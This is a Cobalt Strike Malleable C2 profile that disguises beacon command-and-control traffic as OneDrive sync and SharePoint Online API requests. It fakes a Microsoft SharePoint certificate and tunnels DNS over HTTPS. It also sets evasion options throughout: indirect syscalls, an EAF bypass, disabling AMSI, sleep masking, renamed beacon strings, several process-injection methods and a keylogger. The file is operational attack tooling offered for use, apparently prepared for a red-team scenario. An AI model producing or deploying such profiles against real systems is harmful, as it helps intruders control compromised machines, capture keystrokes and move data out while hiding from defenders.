# Malleable C2 Profile - OneDrive / SharePoint sync theme
# CS 4.12+ / Beacon Booster compatible
# Simulates OneDrive sync client and SharePoint Online API traffic
# Target scenario: fenix-b

set sample_name "OneDrive Sync Engine";
set data_jitter "56";
set host_stage "false";
set tasks_max_size "104857600";
set pipename "OneDrive##_####_############";
set pipename_stager "SyncEngine_###";
set smb_frame_header "";
set ssh_banner "OpenSSH_9.0p1 Ubuntu-1ubuntu8.7";

set sleeptime "25000";
set jitter "44";

set ssh_pipename "sppsvc_####";
set tcp_frame_header "";
set tcp_port "7443";

set headers_remove "";
set steal_token_access_mask "11";
set tasks_proxy_max_size "94371840";
set tasks_dns_proxy_max_size "71680";

dns-beacon {
    set maxdns "255";
    set dns_idle "0.0.0.0";
    set dns_max_txt "252";
    set dns_sleep "0";
    set dns_stager_prepend "";
    set dns_stager_subhost ".sync.874520.";
    set dns_ttl "1";

    set beacon         "sp.rp.";
    set get_A          "sp.ra.";
    set get_AAAA       "sp.r6.";
    set get_TXT        "sp.rt.";
    set put_metadata   "sp.rm.";
    set put_output     "sp.ro.";

    set ns_response "zero";

    set comm_mode "dns-over-https";
    dns-over-https {
        set doh_verb           "POST";
        set doh_useragent      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0";
        set doh_proxy_server   "";
        set doh_server         "cloudflare-dns.com";
        set doh_accept         "application/dns-message";
        header "Content-Type"  "application/dns-message";
    }
}

http-config {
    set headers "Date, Server, Content-Length, Connection, Content-Type, X-MSDAVEXT_Error";
    header "Server" "Microsoft-IIS/10.0";
    header "X-MSDAVEXT_Error" "917656; Access+denied.+Before+opening+files+in+this+location%2c+you+must+first+browse+to+the+web+site+and+select+the+option+to+login+automatically.";
    header "Connection" "keep-alive";
    set trust_x_forwarded_for "true";
    set block_useragents "curl*,lynx*,wget*";
    set allow_useragents "";
}

https-certificate {
    set C "US";
    set CN "*.sharepoint.com";
    set L "Redmond";
    set OU "SharePoint Online";
    set O "Microsoft Corporation";
    set ST "WA";
    set validity "365";
}

http-stager {
    set uri_x86 "/_layouts/15/download.aspx";
    set uri_x64 "/_layouts/15/auth.aspx";

    client {
        parameter "src" "/shared/Docs";
    }

    server {
        header "Content-Type" "text/html; charset=utf-8";
        header "SPRequestGuid" "a4f2c89e-30d1-4000-b5e2-3f8a71b02c49";
        header "X-SharePointHealthScore" "2";
        output {
            prepend "<!DOCTYPE html><html dir=\"ltr\" lang=\"en\"><head><meta name=\"GENERATOR\" content=\"Microsoft SharePoint\"/><title>SharePoint</title></head><body>";
            append "</body></html>\n";
            print;
        }
    }
}

set useragent "Microsoft SkyDriveSync 24.005.0117.0002 ship; Windows NT 10.0 (19045)";

# GET - mimics OneDrive sync delta API
http-get {
    set uri "/_api/v2.0/drives/delta";

    client {
        header "Accept" "application/json";
        header "Accept-Encoding" "gzip, deflate, br";
        header "Sec-Fetch-Site" "same-origin";
        header "Sec-Fetch-Mode" "cors";
        header "Sec-Fetch-Dest" "empty";
        header "X-RequestDigest" "0x3A8F2B1C";

        metadata {
            mask;
            base64;
            prepend "FedAuth=";
            append "; rtFa=true";
            header "Cookie";
        }

        parameter "$select" "id,name,lastModifiedDateTime,size,file,folder";
        parameter "token" "latest";
    }

    server {
        header "Content-Type" "application/json; odata=verbose";
        header "SPRequestGuid" "a4f2c89e-30d1-4000-b5e2-3f8a71b02c49";
        header "X-SharePointHealthScore" "2";
        header "Strict-Transport-Security" "max-age=31536000";

        output {
            mask;
            base64;
            prepend "{\"@odata.context\":\"https://graph.microsoft.com/v2.0/$metadata#drives/delta\",\"@odata.deltaLink\":\"";
            append "\",\"value\":[]}\n";
            print;
        }
    }
}

# POST - mimics SharePoint Online upload/create endpoint
http-post {
    set uri "/_api/web/lists/Documents/items";
    set verb "POST";
    set client_max_post_get_packet "4096";

    client {
        header "Content-Type" "application/json; odata=verbose";
        header "Accept" "application/json; odata=verbose";
        header "Accept-Encoding" "gzip, deflate, br";
        header "Sec-Fetch-Site" "same-origin";
        header "Sec-Fetch-Mode" "cors";
        header "X-RequestDigest" "0x3A8F2B1C";

        output {
            mask;
            base64url;
            uri-append;
        }

        id {
            mask;
            base64url;
            prepend "{\"__metadata\":{\"type\":\"SP.Data.DocumentsItem\"},\"FileLeafRef\":\"";
            append "\",\"Modified\":\"2024-01-15T08:30:00Z\"}\n";
            print;
        }
    }

    server {
        header "Content-Type" "application/json; odata=verbose";
        header "SPRequestGuid" "a4f2c89e-30d1-4000-b5e2-3f8a71b02c49";
        header "X-SharePointHealthScore" "2";

        output {
            mask;
            base64;
            prepend "{\"d\":{\"__metadata\":{\"type\":\"SP.File\"},\"ServerRelativeUrl\":\"/sites/shared/Documents/";
            append "\",\"TimeLastModified\":\"2024-01-15T08:30:00Z\"}}\n";
            print;
        }
    }
}

http-beacon {
    set library "winhttp";
    set data_required "true";
    set data_required_length "192-448";
}

stage {

    set checksum "0";
    set data_store_size "16";

    set copy_pe_header         "true";
    set eaf_bypass             "true";
    set rdll_loader            "PrependLoader";
    set rdll_use_syscalls      "true";
    set rdll_use_driploading   "true";
    set rdll_dripload_delay    "150";

    # Beacon Booster compatible: no transform-obfuscate, no prepend/append in stage transforms

    transform-x86 {
        strrep "ReflectiveLoader" "SyncProvider";
        strrep "beacon.x64.dll" "filesync64.dl";
        strrep "beacon.dll" "fsync.dll";
    }

    transform-x64 {
        strrep "ReflectiveLoader" "SyncProvider";
        strrep "beacon.x64.dll" "filesync64.dl";
        strrep "beacon.dll" "fsync.dll";
    }

    stringw "OneDrive Sync Provider";

    set allocator "VirtualAlloc";
    set cleanup "true";
    set magic_pe "PE";
    set obfuscate "true";
    set sleep_mask "true";
    set syscall_method "Indirect";

    beacon_gate {
      All;
    }

    set smartinject "false";
    set stomppe "true";
    set userwx "false";

    set compile_time "02 May 2024 16:44:00";
    set entry_point "68720";

}

process-inject {

    set allocator "VirtualAllocEx";
    set use_driploading   "true";
    set dripload_delay    "150";

    set min_alloc "16384";
    set startrwx "false";
    set userwx "false";

    set bof_allocator "VirtualAlloc";
    set bof_reuse_memory "true";

    transform-x86 {
        prepend "\x90\x90\x90\x90";
    }

    transform-x64 {
    }

    execute {
        ObfSetThreadContext;
        CreateThread "ntdll.dll!RtlUserThreadStart";
        NtQueueApcThread-s;
        SetThreadContext;
        NtQueueApcThread;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\backgroundTaskHost.exe";
    set spawnto_x64 "%windir%\\sysnative\\backgroundTaskHost.exe";

    set obfuscate "true";
    set pipename "OneDriveSync_####, OneDriveMachine_###";
    set smartinject "true";
    set amsi_disable "true";
    set keylogger "GetAsyncKeyState";
    set cleanup "true";

    transform-x64 {
        strrepex "PortScanner" "Scanner module is complete" "Upload finished";
        strrep "is alive." "is sync.";
    }

    transform-x86 {
        strrepex "PortScanner" "Scanner module is complete" "Upload finished";
        strrep "is alive." "is sync.";
    }
}
